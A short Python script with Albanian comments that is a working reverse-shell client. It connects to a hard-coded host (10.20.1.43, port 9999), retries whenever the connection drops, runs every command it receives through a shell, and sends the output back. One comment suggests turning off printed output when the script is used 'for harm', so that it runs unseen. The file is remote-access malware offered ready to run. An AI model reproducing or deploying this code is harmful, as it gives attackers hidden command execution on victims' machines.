import os
import socket
import subprocess
import time



#Fut adresen e serverit te host
#hiqe komentin nga print jo per sherr, komentoje per sherr

s = socket.socket()
host = '10.20.1.43'
port = 9999


def fillo_lidhjen():
    while True:
        try:
            s.connect((host,port))
            fillo_programin()
        except:
            time.sleep(5)
            continue


def fillo_programin():
    while True:
        try:
            data = s.recv(1024)
            try:
                if data[:2].decode("utf-8") == 'cd':
                    os.chdir(data[3:].decode("utf-8"))
                if len(data) > 0 :
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                           stdout=subprocess.PIPE, stderr= subprocess.PIPE,
                                           stdin=subprocess.PIPE)

                    #string per ta treguar te klienti
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "utf-8")
                    s.send(str.encode(output_str + str(os.getcwd())+ '> '))
                    #print(output_str)
            except:
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '
                                  + "\nGabim, Provoni adresen e plote\n"))

        except:
            fillo_lidhjen()


###############
fillo_lidhjen()








